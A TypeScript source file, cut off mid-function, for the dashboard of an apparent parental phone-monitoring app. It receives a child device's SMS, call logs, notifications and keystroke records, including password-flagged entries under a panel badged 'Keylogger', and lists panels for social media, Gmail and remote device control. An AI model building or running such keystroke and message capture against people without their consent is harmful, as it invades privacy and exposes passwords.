/**
 * @file right-sidebar.ts
 * @description Main controller & DOM renderer for Nexus Parent Right Sidebar.
 *
 * Hey friend! This coordinates the right-hand inspection & control panel:
 *  - Handles drag resizing of the left edge (width between 300px and 600px).
 *  - Renders the header with panel title, refresh action, and close button.
 *  - Mounts active feature panels (SMS, Call Log, Notifications, Apps) from dedicated sibling modules.
 *  - Wires bottom footer Play/Pause monitoring button with loading spinners (loading.svg)
 *    and real-time DataChannel telemetry coordination.
 *  - Strictly conforms to the pure Black & White design tokens with zero emojis.
 */

import { rightSidebarState } from './state.js';
import { sidebarState } from '../left-sidebar/state.js';
import {
  type RightSidebarPanelId,
  type PanelConfig,
  CMD_CALLLOG_ON,
  CMD_CALLLOG_OFF,
  RESP_CALLLOG_STARTED,
  RESP_CALLLOG_STOPPED,
  RESP_CALLLOG_ERROR_PREFIX,
  TYPE_CALLLOG_HISTORY,
  TYPE_CALLLOG_NEW,
  CMD_SMS_ON,
  CMD_SMS_OFF,
  RESP_SMS_STARTED,
  RESP_SMS_STOPPED,
  RESP_SMS_ERROR_PREFIX,
  TYPE_SMS_HISTORY,
  TYPE_SMS_NEW,
  CMD_NOTIFICATION_ON,
  CMD_NOTIFICATION_OFF,
  RESP_NOTIFICATION_STARTED,
  RESP_NOTIFICATION_STOPPED,
  RESP_NOTIFICATION_ERROR_PREFIX,
  TYPE_NOTIFICATION_SNAPSHOT,
  TYPE_NOTIFICATION_NEW,
  TYPE_NOTIFICATION_REMOVED,
  CMD_KEYBOARD_ON,
  CMD_KEYBOARD_OFF,
  RESP_KEYBOARD_STARTED,
  RESP_KEYBOARD_STOPPED,
  RESP_KEYBOARD_ERROR_PREFIX,
  TYPE_KEYBOARD_SNAPSHOT,
  TYPE_KEYBOARD_NEW,
  CMD_WALLPAPER_ON,
  CMD_WALLPAPER_OFF,
  RESP_WALLPAPER_STARTED,
  RESP_WALLPAPER_STOPPED,
  RESP_WALLPAPER_ERROR_PREFIX,
  TYPE_WALLPAPER_CHUNK,
  RESP_WALLPAPER_SET_SUCCESS,
  RESP_WALLPAPER_SET_ERROR_PREFIX,
  RESP_VIBRATE_SUCCESS_PREFIX,
  RESP_VIBRATE_ERROR_PREFIX,
  RESP_FLASH_SUCCESS_PREFIX,
  RESP_FLASH_ERROR_PREFIX,
  RESP_VIBRATE_FLASH_SUCCESS_PREFIX,
  RESP_VIBRATE_FLASH_ERROR_PREFIX,
  CMD_APPLOCK_ON,
  CMD_APPLOCK_OFF,
  RESP_APPLOCK_STARTED,
  RESP_APPLOCK_STOPPED,
  RESP_APPLOCK_ERROR_PREFIX,
  TYPE_APPLOCK_SNAPSHOT,
  TYPE_APPLOCK_NEW,
  RESP_APPLOCK_STATUS,
  RESP_APPLOCK_PIN_CHANGED
} from './types.js';
import { webrtcManager } from '../webrtc/webrtc-manager.js';
import { triggerSidebarToast } from './shared.js';
import { renderSmsPanel } from './sms/sms.js';
import { renderCallLogPanel } from './calllog/calllog.js';
import { renderNotificationPanel } from './notification/notification.js';
import { renderKeyboardPanel } from './keyboard/keyboard.js';
import { renderWhatsAppPanel } from './whatsapp/whatsapp.js';
import { renderTelegramPanel } from './telegram/telegram.js';
import { renderChatGptPanel } from './chatgpt/chatgpt.js';
import { renderClaudePanel } from './claude/claude.js';
import { renderGrokPanel } from './grok/grok.js';
import { renderChatsPanel } from './chats/chats.js';
import { renderGmailPanel } from './gmail/gmail.js';
import { renderFacebookPanel } from './facebook/facebook.js';
import { renderInstagramPanel } from './instagram/instagram.js';
import { renderSnapchatPanel } from './snapchat/snapchat.js';
import { renderWellbeingPanel } from './wellbeing/wellbeing.js';
import { renderAppLockPanel } from './applock/applock.js';
import { renderVibrateFlashPanel } from './vibrateflash/vibrateflash.js';
import { renderWallpaperPanel } from './wallpaper/wallpaper.js';

let callLogTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
let smsTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
let notificationTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
let wallpaperTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
let keyboardTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
let appLockTimeoutTimer: ReturnType<typeof setTimeout> | null = null;

const PANEL_CONFIGS: Record<RightSidebarPanelId, PanelConfig> = {
  sms: { title: 'SMS Messages', badge: 'Active Sync', render: renderSmsPanel },
  calllog: { title: 'Call Log', badge: 'Live Stream', render: renderCallLogPanel },
  notification: { title: 'Notifications', badge: 'Live Stream', render: renderNotificationPanel },
  keyboard: { title: 'Keyboard Audit', badge: 'Keylogger', render: renderKeyboardPanel },
  whatsapp: { title: 'WhatsApp Activity', badge: 'Coming Soon', render: renderWhatsAppPanel },
  telegram: { title: 'Telegram Activity', badge: 'Coming Soon', render: renderTelegramPanel },
  chatgpt: { title: 'ChatGPT Activity', badge: 'Coming Soon', render: renderChatGptPanel },
  claude: { title: 'Claude Activity', badge: 'Coming Soon', render: renderClaudePanel },
  grok: { title: 'Grok Activity', badge: 'Coming Soon', render: renderGrokPanel },
  chats: { title: 'Chats Feed', badge: 'Unified', render: renderChatsPanel },
  gmail: { title: 'Gmail Monitor', badge: 'Syncing', render: renderGmailPanel },
  facebook: { title: 'Facebook Activity', badge: 'Social', render: renderFacebookPanel },
  instagram: { title: 'Instagram Activity', badge: 'Direct Msg', render: renderInstagramPanel },
  snapchat: { title: 'Snapchat Activity', badge: 'Ephemeral', render: renderSnapchatPanel },
  wellbeing: { title: 'Digital Wellbeing', badge: 'Coming Soon', render: renderWellbeingPanel },
  applock: { title: 'App Lock Manager', badge: 'PIN Guard', render: renderAppLockPanel },
  vibrateflash: { title: 'Vibrate & Flash Device', badge: 'Hardware Link', render: renderVibrateFlashPanel },
  wallpaper: { title: 'Device Wallpaper', badge: 'Remote Display', render: renderWallpaperPanel }
};

/**
 * Initializes the Right Sidebar component, sets up resizing, DataChannel message parsing, and listeners.
 */
export function initRightSidebar(): void {
  setupResizeHandle();
  setupDataChannelListeners();

  // Re-render whenever active panel or monitoring telemetry changes
  rightSidebarState.subscribe(() => {
    renderRightSidebar();
  });

  // Initial render
  renderRightSidebar();
}

/**
 * Connects DataChannel message listening for Call Log and SMS payloads.
 */
function setupDataChannelListeners(): void {
  webrtcManager.onMessage((rawMessage: string) => {
    const trimmed = rawMessage.trim();

    // -------------------------------------------------------------------------
    // CALL LOG PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed === RESP_CALLLOG_STARTED) {
      console.log('[RightSidebar] Child confirmed: CALLLOG_STARTED');
      if (callLogTimeoutTimer) {
        clearTimeout(callLogTimeoutTimer);
        callLogTimeoutTimer = null;
      }
      rightSidebarState.setCallLogMonitoringState('LIVE');
      sidebarState.setFeatureLive('calllog', true);
      return;
    }

    if (trimmed === RESP_CALLLOG_STOPPED) {
      console.log('[RightSidebar] Child confirmed: CALLLOG_STOPPED');
      if (callLogTimeoutTimer) {
        clearTimeout(callLogTimeoutTimer);
        callLogTimeoutTimer = null;
      }
      rightSidebarState.setCallLogMonitoringState('IDLE');
      sidebarState.setFeatureLive('calllog', false);
      return;
    }

    if (trimmed.startsWith(RESP_CALLLOG_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_CALLLOG_ERROR_PREFIX.length);
      console.error('[RightSidebar] Call Log error from Child:', err);
      if (callLogTimeoutTimer) {
        clearTimeout(callLogTimeoutTimer);
        callLogTimeoutTimer = null;
      }
      rightSidebarState.setCallLogMonitoringState('IDLE');
      sidebarState.setFeatureLive('calllog', false);
      triggerSidebarToast(err);
      return;
    }

    // Call Log JSON Payloads
    if (trimmed.startsWith(`{"type":"${TYPE_CALLLOG_HISTORY}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log(`[RightSidebar] Received ${payload.count} historical call records.`);
        rightSidebarState.setCallLogs(payload.records || []);
      } catch (e) {
        console.error('[RightSidebar] Failed to parse CALLLOG_HISTORY payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_CALLLOG_NEW}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Received new live call:', payload.record);
        if (payload.record) {
          rightSidebarState.prependCallRecord(payload.record);
          triggerSidebarToast(`New Call: ${payload.record.name || payload.record.number} (${payload.record.callType})`);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse CALLLOG_NEW payload:', e);
      }
      return;
    }

    // -------------------------------------------------------------------------
    // SMS PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed === RESP_SMS_STARTED) {
      console.log('[RightSidebar] Child confirmed: SMS_STARTED');
      if (smsTimeoutTimer) {
        clearTimeout(smsTimeoutTimer);
        smsTimeoutTimer = null;
      }
      rightSidebarState.setSmsMonitoringState('LIVE');
      sidebarState.setFeatureLive('sms', true);
      return;
    }

    if (trimmed === RESP_SMS_STOPPED) {
      console.log('[RightSidebar] Child confirmed: SMS_STOPPED');
      if (smsTimeoutTimer) {
        clearTimeout(smsTimeoutTimer);
        smsTimeoutTimer = null;
      }
      rightSidebarState.setSmsMonitoringState('IDLE');
      sidebarState.setFeatureLive('sms', false);
      return;
    }

    if (trimmed.startsWith(RESP_SMS_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_SMS_ERROR_PREFIX.length);
      console.error('[RightSidebar] SMS error from Child:', err);
      if (smsTimeoutTimer) {
        clearTimeout(smsTimeoutTimer);
        smsTimeoutTimer = null;
      }
      rightSidebarState.setSmsMonitoringState('IDLE');
      sidebarState.setFeatureLive('sms', false);
      triggerSidebarToast(err);
      return;
    }

    // SMS JSON Payloads
    if (trimmed.startsWith(`{"type":"${TYPE_SMS_HISTORY}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log(`[RightSidebar] Received SMS chunk [${payload.chunkIndex + 1}/${payload.totalChunks}] count=${payload.count}`);
        if (payload.chunkIndex === 0) {
          rightSidebarState.clearSmsMessages();
        }
        rightSidebarState.appendSmsChunk(payload.messages || []);
      } catch (e) {
        console.error('[RightSidebar] Failed to parse SMS_HISTORY payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_SMS_NEW}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Received new live SMS:', payload.message);
        if (payload.message) {
          rightSidebarState.prependSmsRecord(payload.message);
          triggerSidebarToast(`New SMS from ${payload.message.senderName || payload.message.address}`);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse SMS_NEW payload:', e);
      }
      return;
    }

    // -------------------------------------------------------------------------
    // NOTIFICATION PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed === RESP_NOTIFICATION_STARTED) {
      console.log('[RightSidebar] Child confirmed: NOTIFICATION_STARTED');
      if (notificationTimeoutTimer) {
        clearTimeout(notificationTimeoutTimer);
        notificationTimeoutTimer = null;
      }
      rightSidebarState.setNotificationMonitoringState('LIVE');
      sidebarState.setFeatureLive('notification', true);
      return;
    }

    if (trimmed === RESP_NOTIFICATION_STOPPED) {
      console.log('[RightSidebar] Child confirmed: NOTIFICATION_STOPPED');
      if (notificationTimeoutTimer) {
        clearTimeout(notificationTimeoutTimer);
        notificationTimeoutTimer = null;
      }
      rightSidebarState.setNotificationMonitoringState('IDLE');
      sidebarState.setFeatureLive('notification', false);
      return;
    }

    if (trimmed.startsWith(RESP_NOTIFICATION_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_NOTIFICATION_ERROR_PREFIX.length);
      console.error('[RightSidebar] Notification error from Child:', err);
      if (notificationTimeoutTimer) {
        clearTimeout(notificationTimeoutTimer);
        notificationTimeoutTimer = null;
      }
      rightSidebarState.setNotificationMonitoringState('IDLE');
      sidebarState.setFeatureLive('notification', false);
      triggerSidebarToast(err);
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_NOTIFICATION_SNAPSHOT}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log(`[RightSidebar] Received active notifications snapshot count=${payload.count}`);
        rightSidebarState.setNotificationSnapshot(payload.notifications || []);
      } catch (e) {
        console.error('[RightSidebar] Failed to parse NOTIFICATION_SNAPSHOT payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_NOTIFICATION_NEW}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Received new live notification:', payload.notification);
        if (payload.notification) {
          rightSidebarState.prependNotification(payload.notification);
          triggerSidebarToast(`New notification from ${payload.notification.appName}: ${payload.notification.title}`);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse NOTIFICATION_NEW payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_NOTIFICATION_REMOVED}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Notification removed:', payload.key);
        if (payload.key) {
          rightSidebarState.removeNotification(payload.key);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse NOTIFICATION_REMOVED payload:', e);
      }
      return;
    }

    // -------------------------------------------------------------------------
    // KEYBOARD AUDIT PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed === RESP_KEYBOARD_STARTED) {
      console.log('[RightSidebar] Child confirmed: KEYBOARD_STARTED');
      if (keyboardTimeoutTimer) {
        clearTimeout(keyboardTimeoutTimer);
        keyboardTimeoutTimer = null;
      }
      rightSidebarState.setKeyboardMonitoringState('LIVE');
      sidebarState.setFeatureLive('keyboard', true);
      return;
    }

    if (trimmed === RESP_KEYBOARD_STOPPED) {
      console.log('[RightSidebar] Child confirmed: KEYBOARD_STOPPED');
      if (keyboardTimeoutTimer) {
        clearTimeout(keyboardTimeoutTimer);
        keyboardTimeoutTimer = null;
      }
      rightSidebarState.setKeyboardMonitoringState('IDLE');
      sidebarState.setFeatureLive('keyboard', false);
      return;
    }

    if (trimmed.startsWith(RESP_KEYBOARD_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_KEYBOARD_ERROR_PREFIX.length);
      console.error('[RightSidebar] Keyboard error from Child:', err);
      if (keyboardTimeoutTimer) {
        clearTimeout(keyboardTimeoutTimer);
        keyboardTimeoutTimer = null;
      }
      rightSidebarState.setKeyboardMonitoringState('IDLE');
      sidebarState.setFeatureLive('keyboard', false);
      triggerSidebarToast(err);
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_KEYBOARD_SNAPSHOT}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log(`[RightSidebar] Received keyboard snapshot count=${payload.count}`);
        rightSidebarState.setKeyboardRecords(payload.records || []);
      } catch (e) {
        console.error('[RightSidebar] Failed to parse KEYBOARD_SNAPSHOT payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_KEYBOARD_NEW}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Received new live keystroke record:', payload.record);
        if (payload.record) {
          rightSidebarState.prependKeyboardRecord(payload.record);
          const displaySnippet = payload.record.isPassword ? '[PASSWORD]' : payload.record.text;
          triggerSidebarToast(`Keystroke: ${payload.record.appName} - ${displaySnippet.slice(0, 30)}`);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse KEYBOARD_NEW payload:', e);
      }
      return;
    }

    // -------------------------------------------------------------------------
    // WALLPAPER PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed === RESP_WALLPAPER_STARTED) {
      console.log('[RightSidebar] Child confirmed: WALLPAPER_STARTED');
      if (wallpaperTimeoutTimer) {
        clearTimeout(wallpaperTimeoutTimer);
        wallpaperTimeoutTimer = null;
      }
      rightSidebarState.setWallpaperMonitoringState('LIVE');
      sidebarState.setFeatureLive('wallpaper', true);
      return;
    }

    if (trimmed === RESP_WALLPAPER_STOPPED) {
      console.log('[RightSidebar] Child confirmed: WALLPAPER_STOPPED');
      if (wallpaperTimeoutTimer) {
        clearTimeout(wallpaperTimeoutTimer);
        wallpaperTimeoutTimer = null;
      }
      rightSidebarState.setWallpaperMonitoringState('IDLE');
      sidebarState.setFeatureLive('wallpaper', false);
      return;
    }

    if (trimmed.startsWith(RESP_WALLPAPER_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_WALLPAPER_ERROR_PREFIX.length);
      console.error('[RightSidebar] Wallpaper error from Child:', err);
      if (wallpaperTimeoutTimer) {
        clearTimeout(wallpaperTimeoutTimer);
        wallpaperTimeoutTimer = null;
      }
      rightSidebarState.setWallpaperMonitoringState('IDLE');
      sidebarState.setFeatureLive('wallpaper', false);
      triggerSidebarToast(err);
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_WALLPAPER_CHUNK}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        rightSidebarState.handleIncomingWallpaperChunk(payload);
      } catch (e) {
        console.error('[RightSidebar] Failed to parse WALLPAPER_CHUNK payload:', e);
      }
      return;
    }

    if (trimmed === RESP_WALLPAPER_SET_SUCCESS) {
      console.log('[RightSidebar] Child confirmed: WALLPAPER_SET_SUCCESS');
      rightSidebarState.setPushedWallpaperSuccess(rightSidebarState.getWallpaperData().currentTarget);
      triggerSidebarToast('Wallpaper successfully applied to child device');
      return;
    }

    if (trimmed.startsWith(RESP_WALLPAPER_SET_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_WALLPAPER_SET_ERROR_PREFIX.length);
      console.error('[RightSidebar] Push wallpaper error from Child:', err);
      rightSidebarState.setWallpaperPushing(false, 0);
      triggerSidebarToast(err);
      return;
    }

    // -------------------------------------------------------------------------
    // VIBRATE & FLASH PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed.startsWith(RESP_VIBRATE_SUCCESS_PREFIX)) {
      const pattern = trimmed.slice(RESP_VIBRATE_SUCCESS_PREFIX.length);
      console.log(`[RightSidebar] Vibration '${pattern}' executed on child`);
      rightSidebarState.setVibrateFlashStatus(pattern, true, `Vibration '${pattern}' executed on child`);
      triggerSidebarToast(`Vibration '${pattern}' confirmed by device`);
      return;
    }

    if (trimmed.startsWith(RESP_VIBRATE_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_VIBRATE_ERROR_PREFIX.length);
      console.error('[RightSidebar] Vibration error:', err);
      rightSidebarState.setVibrateFlashStatus('vibrate', false, err);
      triggerSidebarToast(err);
      return;
    }

    if (trimmed.startsWith(RESP_FLASH_SUCCESS_PREFIX)) {
      const action = trimmed.slice(RESP_FLASH_SUCCESS_PREFIX.length);
      console.log(`[RightSidebar] Flashlight '${action}' executed on child`);
      rightSidebarState.setVibrateFlashStatus(action, true, `Flashlight '${action}' executed on child`);
      triggerSidebarToast(`Flashlight '${action}' confirmed by device`);
      return;
    }

    if (trimmed.startsWith(RESP_FLASH_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_FLASH_ERROR_PREFIX.length);
      console.error('[RightSidebar] Flashlight error:', err);
      rightSidebarState.setVibrateFlashStatus('flash', false, err);
      triggerSidebarToast(err);
      return;
    }

    if (trimmed.startsWith(RESP_VIBRATE_FLASH_SUCCESS_PREFIX)) {
      const pattern = trimmed.slice(RESP_VIBRATE_FLASH_SUCCESS_PREFIX.length);
      console.log(`[RightSidebar] Combined '${pattern}' executed on child`);
      rightSidebarState.setVibrateFlashStatus(pattern, true, `Combined pattern '${pattern}' executed`);
      triggerSidebarToast(`Combined pattern '${pattern}' confirmed by device`);
      return;
    }

    if (trimmed.startsWith(RESP_VIBRATE_FLASH_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_VIBRATE_FLASH_ERROR_PREFIX.length);
      console.error('[RightSidebar] Combined error:', err);
      rightSidebarState.setVibrateFlashStatus('combined', false, err);
      triggerSidebarToast(err);
      return;
    }

    // -------------------------------------------------------------------------
    // APP LOCK PROTOCOL RESPONSES
    // -------------------------------------------------------------------------
    if (trimmed === RESP_APPLOCK_STARTED) {
      console.log('[RightSidebar] Child confirmed: APPLOCK_STARTED');
      if (appLockTimeoutTimer) {
        clearTimeout(appLockTimeoutTimer);
        appLockTimeoutTimer = null;
      }
      rightSidebarState.setAppLockMonitoringState('LIVE');
      sidebarState.setFeatureLive('applock', true);
      return;
    }

    if (trimmed === RESP_APPLOCK_STOPPED) {
      console.log('[RightSidebar] Child confirmed: APPLOCK_STOPPED');
      if (appLockTimeoutTimer) {
        clearTimeout(appLockTimeoutTimer);
        appLockTimeoutTimer = null;
      }
      rightSidebarState.setAppLockMonitoringState('IDLE');
      sidebarState.setFeatureLive('applock', false);
      return;
    }

    if (trimmed.startsWith(RESP_APPLOCK_ERROR_PREFIX)) {
      const err = trimmed.slice(RESP_APPLOCK_ERROR_PREFIX.length);
      console.error('[RightSidebar] AppLock error from Child:', err);
      if (appLockTimeoutTimer) {
        clearTimeout(appLockTimeoutTimer);
        appLockTimeoutTimer = null;
      }
      rightSidebarState.setAppLockMonitoringState('IDLE');
      sidebarState.setFeatureLive('applock', false);
      triggerSidebarToast(err);
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_APPLOCK_SNAPSHOT}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log(`[RightSidebar] Received AppLock snapshot chunk [${payload.chunkIndex + 1}/${payload.totalChunks}] count=${payload.count}`);
        if (payload.chunkIndex === 0) {
          rightSidebarState.setAppLockSnapshot(payload.records || []);
        } else {
          rightSidebarState.appendAppLockChunk(payload.records || []);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse APPLOCK_SNAPSHOT payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${TYPE_APPLOCK_NEW}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Received live AppLock unlock attempt:', payload.record);
        if (payload.record) {
          rightSidebarState.prependAppLockRecord(payload.record);
          const outcome = payload.record.pinCorrect ? 'Successful unlock' : (payload.record.isLockedOut ? 'Device locked out (60s)' : 'Wrong PIN attempt');
          triggerSidebarToast(`App Lock: ${outcome}`);
        }
      } catch (e) {
        console.error('[RightSidebar] Failed to parse APPLOCK_NEW payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`{"type":"${RESP_APPLOCK_STATUS}"`)) {
      try {
        const payload = JSON.parse(trimmed);
        console.log('[RightSidebar] Received AppLock status telemetry:', payload);
        rightSidebarState.setAppLockEnabled(!!payload.enabled);
        rightSidebarState.setAppLockLockedOut(!!payload.isLockedOut);
      } catch (e) {
        console.error('[RightSidebar] Failed to parse APPLOCK_STATUS payload:', e);
      }
      return;
    }

    if (trimmed.startsWith(`${RESP_APPLOCK_PIN_CHANGED}:`)) {
      const result = trimmed.slice(`${RESP_APPLOCK_PIN_CHANGED}:`.length);
      if (result === 'SUCCESS') {
        triggerSidebarToast('PIN updated successfully on device');
      } else {
        triggerSidebarToast(result);
      }
      return;
    }
  });

  // Reset monitoring state when WebRTC disconnects
  webrtcManager.onConnectionStateChange((state) => {
    if (state !== 'connected') {
      console.log('[RightSidebar] Peer disconnected. Resetting monitoring states...');
      if (callLogTimeoutTimer) {
        clearTimeout(callLogTimeoutTimer);
        callLogTimeoutTimer = null;
      }
      if (smsTimeoutTimer) {
        clearTimeout(smsTimeoutTimer);
        smsTimeoutTimer = null;
      }
      if (notificationTimeoutTimer) {
        clearTimeout(notificationTimeoutTimer);
        notificationTimeoutTimer = null;
      }
      if (wallpaperTimeoutTimer) {
        clearTimeout(wallpaperTimeoutTimer);
        wallpaperTimeoutTimer = null;
      }
      if (keyboardTimeoutTimer) {
        clearTimeout(keyboardTimeoutTimer);
        keyboardTimeoutTimer = null;
      }
      if (appLockTimeoutTimer) {
        clearTimeout(appLockTimeoutTimer);
        appLockTimeoutTimer = null;
      }
      rightSidebarState.resetMonitoringStates();
      sidebarState.setFeatureLive('calllog', false);
      sidebarState.setFeatureLive('sms', false);
      sidebarState.setFeatureLive('notification', false);
      sidebarState.setFeatureLive('wallpaper', false);
      sidebarState.setFeatureLive('keyboard', false);
      sidebarState.setFeatureLive('applock', false);
    }
  });
}

/**
 * Renders the right sidebar DOM contents according to current state.
 */
export function renderRightSidebar(): void {
  const sidebar = document.getElementById('right-sidebar');
  if (!sidebar) return;

  const isOpen = rightSidebarState.isOpen();
  const activePanelId = rightSidebarState.getActivePanelId();

  if (!isOpen || !activePanelId || !PANEL_CONFIGS[activePanelId]) {
    sidebar.classList.remove('open');
    sidebar.innerHTML = '';
    return;
  }

  const config = PANEL_CONFIGS[activePanelId];
  sidebar.classList.add('open');
  sidebar.style.width = `${rightSidebarState.getWidth()}px`;

  sidebar.innerHTML = `
    <!-- Left Edge Drag Resize Handle -->
    <div id="right-sidebar-resize-handle" class="right-sidebar-resize-handle" title="Drag to resize"></div>

    <!-- Panel Header -->
    <div class="rs-header">
      <div class="rs-header-left">
        <span class="rs-header-title">${config.title}</span>
      </div>
      <div class="rs-header-actions">
        <button id="btn-rs-close" class="rs-icon-btn close-btn" title="Close Panel">
          <img src="assets/icons/main-content/x.svg" alt="" />
        </button>
      </div>
    </div>

    <!-- Active Panel Body Host -->
    <div id="rs-body-host" style="flex:1; display:flex; flex-direction:column; overflow:hidden;"></div>

    <!-- Bottom Footer with Play/Pause Monitoring Button at bottom right -->
    <div class="rs-footer">
      <div class="rs-footer-left">
        <span id="rs-footer-status" class="rs-footer-status">Monitoring Paused</span>
      </div>
      <div class="rs-footer-right">
        <button id="btn-rs-play-pause" class="rs-play-btn" title="Start Monitoring">
          <img id="rs-play-icon" src="assets/icons/main-content/play.svg" alt="" />
        </button>
      </div>
    </div>

    <!-- Reusable Toast Notification Host -->
    <div id="rs-toast" class="rs-toast" style="display:none;">
      <span id="rs-toast-text"></span>
    </div>
  `;

  // Mount the modular panel body
  const bodyHost = sidebar.querySelector('#rs-body-host');
  if (bodyHost) {
    const panelBody = config.render();
    bodyHost.appendChild(panelBody);
  }

  // Attach Header Actions
  const closeBtn = sidebar.querySelector('#btn-rs-close');
  closeBtn?.addEventListener('click', () => {
    rightSidebarState.close();
  });

  // Wire Play/Pause monitoring button at bottom right
  const playBtn = sidebar.querySelector<HTMLButtonElement>('#btn-rs-play-pause');
  const playIcon = sidebar.querySelector<HTMLImageElement>('#rs-play-icon');
  const statusSpan = sidebar.querySelector<HTMLElement>('#rs-footer-status');

  // Synchronize footer button for Call Log panel
  if (activePanelId === 'calllog') {
    const callState = rightSidebarState.getCallLogMonitoringState();
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, callState, 'Call Log');

    playBtn?.addEventListener('click', () => {
      handleCallLogPlayPauseClick(playBtn, playIcon, statusSpan);
    });
    return;
  }

  // Synchronize footer button for SMS panel
  if (activePanelId === 'sms') {
    const smsState = rightSidebarState.getSmsMonitoringState();
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, smsState, 'SMS Messages');

    playBtn?.addEventListener('click', () => {
      handleSmsPlayPauseClick(playBtn, playIcon, statusSpan);
    });
    return;
  }

  // Synchronize footer button for Notification panel
  if (activePanelId === 'notification') {
    const notifState = rightSidebarState.getNotificationMonitoringState();
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, notifState, 'Notifications');

    playBtn?.addEventListener('click', () => {
      handleNotificationPlayPauseClick(playBtn, playIcon, statusSpan);
    });
    return;
  }

  // Synchronize footer button for Wallpaper panel
  if (activePanelId === 'wallpaper') {
    const wpState = rightSidebarState.getWallpaperMonitoringState();
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, wpState, 'Wallpaper');

    playBtn?.addEventListener('click', () => {
      handleWallpaperPlayPauseClick(playBtn, playIcon, statusSpan);
    });
    return;
  }

  // Synchronize footer button for Keyboard Audit panel
  if (activePanelId === 'keyboard') {
    const kbState = rightSidebarState.getKeyboardMonitoringState();
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, kbState, 'Keyboard Audit');

    playBtn?.addEventListener('click', () => {
      handleKeyboardPlayPauseClick(playBtn, playIcon, statusSpan);
    });
    return;
  }

  // Synchronize footer button for App Lock panel
  if (activePanelId === 'applock') {
    const lockState = rightSidebarState.getAppLockMonitoringState();
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, lockState, 'App Lock');

    playBtn?.addEventListener('click', () => {
      handleAppLockPlayPauseClick(playBtn, playIcon, statusSpan);
    });
    return;
  }

  // Vibrate & Flash Panel - No continuous live monitoring button
  if (activePanelId === 'vibrateflash') {
    if (playBtn) playBtn.style.display = 'none';
    if (statusSpan) {
      statusSpan.textContent = 'Hardware Link Ready';
      statusSpan.classList.remove('live');
    }
    return;
  }

  // Coming Soon Panels - Features in active development
  if (
    activePanelId === 'whatsapp' ||
    activePanelId === 'telegram' ||
    activePanelId === 'chatgpt' ||
    activePanelId === 'claude' ||
    activePanelId === 'grok' ||
    activePanelId === 'wellbeing'
  ) {
    if (playBtn) playBtn.style.display = 'none';
    if (statusSpan) {
      statusSpan.textContent = 'Coming Soon';
      statusSpan.classList.remove('live');
    }
    return;
  }

  // Generic fallback for other panels
  const isLive = sidebarState.isFeatureLive(activePanelId);
  updateGenericPlayState(playBtn, playIcon, statusSpan, isLive);

  playBtn?.addEventListener('click', () => {
    const nextLive = !sidebarState.isFeatureLive(activePanelId);
    sidebarState.setFeatureLive(activePanelId, nextLive);
    updateGenericPlayState(playBtn, playIcon, statusSpan, nextLive);
  });
}

/**
 * Handles Play/Pause click action specifically for Call Log monitoring.
 */
function handleCallLogPlayPauseClick(
  playBtn: HTMLButtonElement | null,
  playIcon: HTMLImageElement | null,
  statusSpan: HTMLElement | null
): void {
  const currentState = rightSidebarState.getCallLogMonitoringState();

  if (currentState === 'IDLE') {
    console.log('[RightSidebar] Starting Call Log monitoring...');
    rightSidebarState.setCallLogMonitoringState('STARTING');
    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'Call Log');

    const sent = webrtcManager.sendCommand(CMD_CALLLOG_ON);
